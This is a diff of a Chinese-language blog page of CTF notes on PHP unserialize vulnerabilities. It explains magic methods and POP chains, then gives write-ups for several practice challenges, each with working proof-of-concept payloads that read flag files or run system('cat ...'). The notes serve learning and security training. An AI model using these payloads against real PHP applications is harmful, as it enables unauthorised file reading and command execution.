@@ -1,353 +1,861 @@
-<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>PHP 反序列化 | Console.makeHappy(_1ming)</title><meta name=keywords content="CTF,PHP,Web,Note"><meta name=description content="基础知识 常见PHP魔术函数 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __wakeup() //使用unserialize时触发 __sleep() //使用seria"><meta name=author content="Yiming Shen"><link rel=canonical href=https://shenyiming.life/post/ctf/unserialize/php/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link href=/assets/css/stylesheet.min.96ff96383199830fa3579b27d0827aa2d1dc17d7ac4182b5dca790d464d24229.css integrity="sha256-lv+WODGZgw+jV5sn0IJ6otHcF9esQYK13KeQ1GTSQik=" rel="preload stylesheet" as=style><link rel=icon href=https://shenyiming.life/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://shenyiming.life/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://shenyiming.life/favicon-32x32.png><link rel=apple-touch-icon href=https://shenyiming.life/apple-touch-icon.png><link rel=mask-icon href=https://shenyiming.life/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.101.0"><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin=anonymous></script>
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>PHP 反序列化 | Console.makeHappy(_1ming)</title>
+<meta name=keywords content="CTF,PHP,Web,Note">
+<meta name=description content="基础知识 常见PHP魔术函数 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __wakeup() //使用unserialize时触发 __sleep() //使用seria">
+<meta name=author content="Yiming Shen">
+<link rel=canonical href=https://shenyiming.life/post/ctf/unserialize/php/>
+<meta name=google-site-verification content="XYZabc">
+<meta name=yandex-verification content="XYZabc">
+<meta name=msvalidate.01 content="XYZabc">
+<link href=/assets/css/stylesheet.min.96ff96383199830fa3579b27d0827aa2d1dc17d7ac4182b5dca790d464d24229.css integrity="sha256-lv+WODGZgw+jV5sn0IJ6otHcF9esQYK13KeQ1GTSQik=" rel="preload stylesheet" as=style>
+<link rel=icon href=https://shenyiming.life/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://shenyiming.life/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://shenyiming.life/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://shenyiming.life/apple-touch-icon.png>
+<link rel=mask-icon href=https://shenyiming.life/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.91.0">
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css integrity=sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X crossorigin=anonymous>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js integrity=sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4 crossorigin=anonymous></script>
 <script defer src=https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js integrity=sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa crossorigin=anonymous onload=renderMathInElement(document.body)></script>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-123-45","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><meta property="og:title" content="PHP 反序列化"><meta property="og:description" content="基础知识 常见PHP魔术函数 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __wakeup() //使用unserialize时触发 __sleep() //使用seria"><meta property="og:type" content="article"><meta property="og:url" content="https://shenyiming.life/post/ctf/unserialize/php/"><meta property="og:image" content="https://shenyiming.life/android-chrome-512x512.png"><meta property="article:section" content="post"><meta property="article:published_time" content="2022-06-11T00:00:00+00:00"><meta property="article:modified_time" content="2022-07-07T00:00:00+00:00"><meta property="og:site_name" content="Yiming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://shenyiming.life/android-chrome-512x512.png"><meta name=twitter:title content="PHP 反序列化"><meta name=twitter:description content="基础知识 常见PHP魔术函数 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __wakeup() //使用unserialize时触发 __sleep() //使用seria"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"文章","item":"https://shenyiming.life/post/"},{"@type":"ListItem","position":3,"name":"🏁CTF","item":"https://shenyiming.life/post/ctf/"},{"@type":"ListItem","position":4,"name":"Unserialize","item":"https://shenyiming.life/post/ctf/unserialize/"},{"@type":"ListItem","position":5,"name":"PHP 反序列化","item":"https://shenyiming.life/post/ctf/unserialize/php/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"PHP 反序列化","name":"PHP 反序列化","description":"基础知识 常见PHP魔术函数 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __wakeup() //使用unserialize时触发 __sleep() //使用seria","keywords":["CTF","PHP","Web","Note"],"articleBody":"基础知识 常见PHP魔术函数 __construct() //当一个对象创建时被调用 __destruct() //当一个对象销毁时被调用 __wakeup() //使用unserialize时触发 __sleep() //使用serialize时触发 __destruct() //对象被销毁时触发 __call() //在对象上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据 __set() //用于将数据写入不可访问的属性 __toString() //把类当作字符串使用时触发 __invoke() //当脚本尝试将对象调用为函数时触发 审POP链的过程，需要熟练掌握魔术函数。\n掌握面向对象概念以及PHP中的类与对象 序列化与反序列化 序列化：把对象转换为字节序列的过程，便于存储或传输。\n反序列化：把字节序列恢复为对象的过程。\n漏洞可能出现的位置 1.解析认证token、session的位置\n2.将序列化的对象存储到磁盘文件或存入数据库后反序列化时的位置，如读取json文件，xml文件等\n3.将对象序列化后在网络中传输，如传输json数据，xml数据等\n4.参数传递给程序\n5.使用RMI协议，被广泛使用的RMI协议完全基于序列化\n6.使用了不安全的框架或基础类库，如JMX 、Fastjson和Jackson等\n7.定义协议用来接收与发送原始的java对象\n原理 在程序将字节序列恢复为对象的过程中，信任了可能被第三方篡改过的字节序列（内容可控），在将其反序列化的过程中，通过触发魔术方法（Python、PHP）或反射机制（JAVA），实现传入任意参数调用方法（POP链利用）。\n序列化后的对象字符串 O:1:\"A\":1:{s:7:\"%00A%00name\";s:6:\"As1def\";} // O代表这是一个对象，第一个1代表对象名称的长度，第二个1代表成员个数。 // 大括号中分别是：属性名类型、长度、名称;值类型、长度、值。 // s代表string类型 // 另外还有b=\u003ebool i=\u003eint d=\u003edouble a=\u003earray r=\u003e对象引用 R=\u003e 指针引用 N=\u003eNULL; // 有%00是加上protected或private关键字限定的类变量，这种类变量在进行反序列化操作时需要对其进行URL编码，否则存在%0A错误解析成截断的可能性。 POP链构造 POP（Property-Oriented Programing）面向属性编程，用于上层语言构造特定调用链的方法，从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构造一组连续的调用链，达到攻击者恶意利用的目的。\n即构造一条完整的调用链，通过控制对象的属性实现控制程序的执行流程，达到利用无害代码实现有害操作的目的。\n实例 \u003c?php //flag is in flag.php error_reporting(1); class Read { public $var; public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } public function __invoke(){ $content = $this-\u003efile_get($this-\u003evar); echo $content; } } class Show { public $source; public $str; public function __construct($file='index.php') { $this-\u003esource = $file; echo $this-\u003esource.'Welcome'.\"\n\"; } public function __toString() { return $this-\u003estr['str']-\u003esource; } public function _show() { if(preg_match('/gopher|http|ftp|https|dict|\\.\\.|flag|file/i',$this-\u003esource)) { die('hacker'); } else { highlight_file($this-\u003esource); } } public function __wakeup() { if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-\u003esource)) { echo \"hacker\"; $this-\u003esource = \"index.php\"; } } } class Test { public $p; public function __construct() { $this-\u003ep = array(); } public function __get($key) { $function = $this-\u003ep; return $function(); } } if(isset($_GET['hello'])) { unserialize($_GET['hello']); } else { $show = new Show('pop3.php'); $show-\u003e_show(); } 分析思路 先找到能利用的点：Read.file_get里的file_get_contents可以获取文件，在作为对象函数执行（__invoke）时可读取文件。 可控的是get传入的hello参数，将hello值反序列化，此时会调用__wakeup方法，只有Show类中存在该方法。\\_\\_wakeup方法中会对$this-\u003esource进行正则匹配，此时会将source的内容当作字符串处理，即调用__toString()方法。 __toString方法中读取了$this-\u003estr['str']-\u003esource，如果str['str']对象中没有source这个变量呢？此时就会调用__get魔术方法（如果该对象存在这个方法的话）。 观察程序，发现只有Test类有__get方法，用Test类继续构造POP链，会调用$this-\u003ep变量，并将$this-\u003ep作为函数执行，此时就来到了我们找到的利用点——Read类中的__invoke魔术方法！ 如此，我们构造好了一条POP链：\n$_GET['hello']-\u003eShow.__wakeup-\u003eShow.__toString-\u003eTest.__get-\u003eRead.__invoke-\u003eRead.file_get-\u003e读取任意文件\n得到POC\n\u003c?php class Read{ public $var = \"flag.php\"; } class Show{ public $source; public $str; } class Test{ public $p; } $read = new Read(); $show = new Show(); $test = new Test(); $show-\u003estr['str']=$test; $test-\u003ep=$read; echo serialize($show); echo ' '; $show-\u003esource=$show; //这个地方是为了触发Show类中的__toString方法，因为正则判断是对source进行字符串化 echo serialize($show); ?\u003e 总结 先观察是否存在利用点 可执行命令、文件包含的敏感函数 参数可控的变量、入口 注意所有魔术方法 将魔术方法执行顺序连成一条链 确定对象调用顺序，填入对象变量参数，构造POP链 题目 [[网鼎杯 2020 青龙组]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz) \u003c?php include(\"flag.php\"); highlight_file(__FILE__); class FileHandler { protected $op; protected $filename; protected $content; function __construct() { $op = \"1\"; $filename = \"/tmp/tmpfile\"; $content = \"Hello World!\"; $this-\u003eprocess(); } public function process() { if($this-\u003eop == \"1\") { $this-\u003ewrite(); } else if($this-\u003eop == \"2\") { $res = $this-\u003eread(); $this-\u003eoutput($res); } else { $this-\u003eoutput(\"Bad Hacker!\"); } } private function write() { if(isset($this-\u003efilename) \u0026\u0026 isset($this-\u003econtent)) { if(strlen((string)$this-\u003econtent) \u003e 100) { $this-\u003eoutput(\"Too long!\"); die(); } $res = file_put_contents($this-\u003efilename, $this-\u003econtent); if($res) $this-\u003eoutput(\"Successful!\"); else $this-\u003eoutput(\"Failed!\"); } else { $this-\u003eoutput(\"Failed!\"); } } private function read() { $res = \"\"; if(isset($this-\u003efilename)) { $res = file_get_contents($this-\u003efilename); } return $res; } private function output($s) { echo \"[Result]: \"; echo $s; } function __destruct() { if($this-\u003eop === \"2\") $this-\u003eop = \"1\"; $this-\u003econtent = \"\"; $this-\u003eprocess(); } } function is_valid($s) { for($i = 0; $i \u003c strlen($s); $i++) if(!(ord($s[$i]) \u003e= 32 \u0026\u0026 ord($s[$i]) \u003c= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } } 观察发现，有反序列化入口，为传入的get参数$str\n会先检查ASCII码是否符合条件，而类FileHandler中的三个变量均为Protected类型，序列化后会有\\x00*\\x00标识，而\\x00的ASCII码值为0，不符合条件。\n利用PHP特性绕过反序列化限制 PHP 7.1+版本对属性类型不敏感，可将Protected直接换成Public也可反序列化。 可用S代替s，如此可支持解析16进制文本，即将非ASCII文本变成16进制文本 PHP 弱类型绕过 类中有一个析构函数__destruct，在对象销毁后，会执行一次写文件覆盖操作，需要绕过。\n注意到析构函数中判断使用的是强类型相等===，而process类中的判断时弱类型相等==，可以利用PHP语言特性绕过：\"2\"==2,2!===\"2\"\n令$op=2而不是\"2\"即可\n构造POC \u003c?php use FileHandler as GlobalFileHandler; class FileHandler{ public $op=2; public $filename=\"flag.php\"; public $content; } $fileHandler = new FileHandler(); echo serialize($fileHandler); ?\u003e 得到\nO:11:\"FileHandler\":3:{s:2:\"op\";i:2;s:8:\"filename\";s:8:\"flag.php\";s:7:\"content\";N;} 执行查看源代码即得到Flag。\n[[网鼎杯 2020 朱雀组]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb) 进入题目环境后查看源代码，有两个隐藏的表单输入框，同时定时每5秒提交表单，抓包并分析报错可知，是call_user_func方法，第一个参数是要调用的函数名，第二个参数是要调用的函数的参数。\n直接highlight_file读取本页面源码，得到：\n\u003c?php // phpweb poc $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\", \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"); function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == \"string\") { return $result; } else {return \"\";} } class Test { var $p = \"Y-m-d h:i:s a\"; var $func = \"date\"; function __destruct() { if ($this-\u003efunc != \"\") { echo gettime($this-\u003efunc, $this-\u003ep); } } } $func = $_REQUEST[\"func\"]; $p = $_REQUEST[\"p\"]; if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(\"Hacker...\"); } } ?\u003e 无过滤，直来直去，直接构造POC\n\u003c?php class Test{ // var $p = \"find / -name flag*\"; 先查一下服务器中含有flag的文件名，找到位置 var $p = \"cat /tmp/flagoefiu4r93\"; var $func = \"system\"; } $test = new Test (); echo urlencode(serialize($test)); ?\u003e [安洵杯 2019] easy_serialize_php \u003c?php // d0g3_f1ag.php $function = @$_GET['f']; function filter($img){ $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } if($_SESSION){ unset($_SESSION); } $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = $function; extract($_POST); if(!$function){ echo 'source_code'; } if(!$_GET['img_path']){ $_SESSION['img'] = base64_encode('guest_img.png'); }else{ $_SESSION['img'] = sha1(base64_encode($_GET['img_path'])); } $serialize_info = filter(serialize($_SESSION)); if($function == 'highlight_file'){ highlight_file('index.php'); }else if($function == 'phpinfo'){ eval('phpinfo();'); //maybe you can find something in here! }else if($function == 'show_image'){ $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img'])); } 先查看phpinfo，发现敏感文件泄露：d0g3_f1ag.php，即使用file_get_contents读该文件 存在过滤，以及使用sha1函数替换了用户传入的img_path，sha1和base64应该是不太可能碰撞的，考虑绕过过滤。 过滤方式是简单替换为空，存在绕过的可能。 知识点 本题的$_SESSION其实并不是PHP的自带变量，而是用户定义的变量，我们在extract($_POST)这里通过POST方式控制其内容。\n不是只有类和对象才有序列化和反序列化，类、对象、数组、变量均可进行序列化。\na - array b - boolean d - double i - integer o - common object r - reference s - string C - custom object O - class N - null R - pointer reference U - unicode string PHP进行反序列化时，并不要求字符串严格按照格式，而是按照从左至右的顺序和预先安排的字符个数进行依次读取。\n故而在未遇到字符串尾：;和读满字符个数之前，会将遇到的所有字符当作相应的对象名或内容。\nPHP 反序列化字符逃逸 字符逃逸的本质即为闭合。分为两种情况，一是字符变多，二是字符变少。\n本题存在过滤后字符变少的情况。\n由于程序会将$_SESSION['img']设置为固定值，我们要控制改变这里的值，需要让程序错位读取我们设置的值。\n我们希望的img序列化结果(读取base64编码后的d0g3_f1ag.php)：\ns:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";\n我们可以在程序反序列化时，添加一个新的数组元素，覆盖掉原有的img元素，类似于SQL注入\n$_SESSION['xx']='\";s:3:\"abc\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}'\n$_SESSION序列化后：\na:1:{s:2:\"xx\";s:51:\"\";s:3:\"aaa\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";}\n此时数一下多余的字符数：;s:51:\"\"为8个，可用flagflag拼凑\na:1:{s:8:\"flagflag\";s:51:\"\";s:3:\"aaa\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";}\n被过滤后，变成了： a:1:{s:8:\"\";s:51:\"\";s:3:\"aaa\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";}，此时，原先多余的八个字符正好会被当作第一个元素的名字，而s:3:\"aaa\"即为它的值，而后面的img参数能被正常解析成功！\nPayload\nPOST： $_SESSION['flagflag']=\";s:3:\"abc\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\n(去掉两个单引号是因为http协议中的post请求无需用引号覆盖，而PHP的字符串内容需要单引号)\n[MRCTF2020]Ezpop 本题与POP链构造的实例相同，需要注意的是最后的文件读取用的是文件包含include的函数，故而需要用到文件包含的php://filter伪协议。\nPOC\n\u003c?php class Modifier{ protected $var='php://filter/convert.base64-encode/resource=flag.php'; } class Show{ public $source; public $str; public function __construct($file='flag.php'){ $this-\u003esource = $file; // echo 'Welcome to '.$this-\u003esource.\"\n\"; } } class Test{ public $p; } $modifier = new Modifier(); $show = new Show(); $test = new Test(); $test-\u003ep = $modifier; $show-\u003estr = $test; $show-\u003esource = $show; echo urlencode(serialize($show)); ?\u003e 参考 PHP反序列化和POP链构造 - As1def’s Blog 一题教你学会构造PHP反序列化POP链 BUUCTF刷题——PHP反序列化 - CA01H’ Blog PHP 反序列化——字符逃逸 ","wordCount":"4011","inLanguage":"en","datePublished":"2022-06-11T00:00:00Z","dateModified":"2022-07-07T00:00:00Z","author":{"@type":"Person","name":"Yiming Shen"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://shenyiming.life/post/ctf/unserialize/php/"},"publisher":{"@type":"Organization","name":"Console.makeHappy(_1ming)","logo":{"@type":"ImageObject","url":"https://shenyiming.life/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://shenyiming.life accesskey=h title="相位  (Alt + H)"><img src=/favicon.ico alt=logo aria-label=logo height=35>相位</a>
-<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://shenyiming.life/post/ title=文章><span>文章</span></a></li><li><a href=https://shenyiming.life/archive/ title=归档><span>归档</span></a></li><li><a href=https://shenyiming.life/categories/ title=分类><span>分类</span></a></li><li><a href=https://shenyiming.life/tags/ title=标签><span>标签</span></a></li><li><a href=https://shenyiming.life/search/ title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://shenyiming.life/friends/ title=友链><span>友链</span></a></li><li><a href=https://shenyiming.life/about/ title=关于><span>关于</span></a></li></ul></nav></header><main class=main><style>:root{--article-font-family:"Noto Serif SC", var(--base-font-family)}</style><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://shenyiming.life>首页</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/post/>文章</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/post/ctf/>🏁CTF</a>&nbsp;»&nbsp;<a href=https://shenyiming.life/post/ctf/unserialize/>Unserialize</a></div><h1 class=post-title>PHP 反序列化</h1><div class=post-meta><style>:root{--article-font-family:"Noto Serif SC", var(--base-font-family)}</style><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script>June 11, 2022&nbsp;·&nbsp;July 7, 2022&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Yiming Shen
-|&nbsp;<a href=https://github.com/shenyimings/shenyimings.github.io/tree/main/docs rel="noopener noreferrer" target=_blank>Issue</a></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><ul><li><a href=#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86 aria-label=基础知识>基础知识</a></li><li><a href=#%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8e%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96 aria-label=序列化与反序列化>序列化与反序列化</a><ul><li><a href=#%e6%bc%8f%e6%b4%9e%e5%8f%af%e8%83%bd%e5%87%ba%e7%8e%b0%e7%9a%84%e4%bd%8d%e7%bd%ae aria-label=漏洞可能出现的位置>漏洞可能出现的位置</a></li><li><a href=#%e5%8e%9f%e7%90%86 aria-label=原理>原理</a></li><li><a href=#%e5%ba%8f%e5%88%97%e5%8c%96%e5%90%8e%e7%9a%84%e5%af%b9%e8%b1%a1%e5%ad%97%e7%ac%a6%e4%b8%b2 aria-label=序列化后的对象字符串>序列化后的对象字符串</a></li></ul></li><li><a href=#pop%e9%93%be%e6%9e%84%e9%80%a0 aria-label=POP链构造>POP链构造</a><ul><li><a href=#%e5%ae%9e%e4%be%8b aria-label=实例>实例</a><ul><li><a href=#%e5%88%86%e6%9e%90%e6%80%9d%e8%b7%af aria-label=分析思路>分析思路</a></li><li><a href=#%e6%80%bb%e7%bb%93 aria-label=总结>总结</a></li></ul></li></ul></li><li><a href=#%e9%a2%98%e7%9b%ae aria-label=题目>题目</a><ul><li><a href=#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e9%9d%92%e9%be%99%e7%bb%84areuserialzhttpsbuuojcnchallenges%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e9%9d%92%e9%be%99%e7%bb%84areuserialz aria-label="[[网鼎杯 2020 青龙组]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz)">[[网鼎杯 2020 青龙组]AreUSerialz](https://buuoj.cn/challenges#[网鼎杯 2020 青龙组]AreUSerialz)</a><ul><li><a href=#%e5%88%a9%e7%94%a8php%e7%89%b9%e6%80%a7%e7%bb%95%e8%bf%87%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e9%99%90%e5%88%b6 aria-label=利用PHP特性绕过反序列化限制><strong>利用PHP特性绕过反序列化限制</strong></a></li><li><a href=#php-%e5%bc%b1%e7%b1%bb%e5%9e%8b%e7%bb%95%e8%bf%87 aria-label="PHP 弱类型绕过">PHP 弱类型绕过</a></li><li><a href=#%e6%9e%84%e9%80%a0poc aria-label=构造POC>构造POC</a></li></ul></li><li><a href=#%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e6%9c%b1%e9%9b%80%e7%bb%84phpwebhttpsbuuojcnchallenges%e7%bd%91%e9%bc%8e%e6%9d%af-2020-%e6%9c%b1%e9%9b%80%e7%bb%84phpweb aria-label="[[网鼎杯 2020 朱雀组]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb)">[[网鼎杯 2020 朱雀组]phpweb](https://buuoj.cn/challenges#[网鼎杯 2020 朱雀组]phpweb)</a></li><li><a href=#%e5%ae%89%e6%b4%b5%e6%9d%af-2019-easy_serialize_php aria-label="[安洵杯 2019] easy_serialize_php">[安洵杯 2019] easy_serialize_php</a><ul><li><a href=#%e7%9f%a5%e8%af%86%e7%82%b9 aria-label=知识点>知识点</a></li><li><a href=#php-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%97%e7%ac%a6%e9%80%83%e9%80%b8 aria-label="PHP 反序列化字符逃逸">PHP 反序列化字符逃逸</a></li></ul></li><li><a href=#mrctf2020ezpop aria-label=[MRCTF2020]Ezpop>[MRCTF2020]Ezpop</a></li></ul></li><li><a href=#%e5%8f%82%e8%80%83 aria-label=参考>参考</a></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=基础知识>基础知识<a hidden class=anchor aria-hidden=true href=#基础知识>#</a></h2><ol><li>常见PHP魔术函数</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>__construct</span>() <span style=color:#75715e>//当一个对象创建时被调用
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>__destruct</span>() <span style=color:#75715e>//当一个对象销毁时被调用
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>__wakeup</span>() <span style=color:#75715e>//使用unserialize时触发
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>__sleep</span>() <span style=color:#75715e>//使用serialize时触发
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>__destruct</span>() <span style=color:#75715e>//对象被销毁时触发
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>__call</span>() <span style=color:#75715e>//在对象上下文中调用不可访问的方法时触发
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>__get</span>() <span style=color:#75715e>//用于从不可访问的属性读取数据
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span><span style=color:#a6e22e>__set</span>() <span style=color:#75715e>//用于将数据写入不可访问的属性
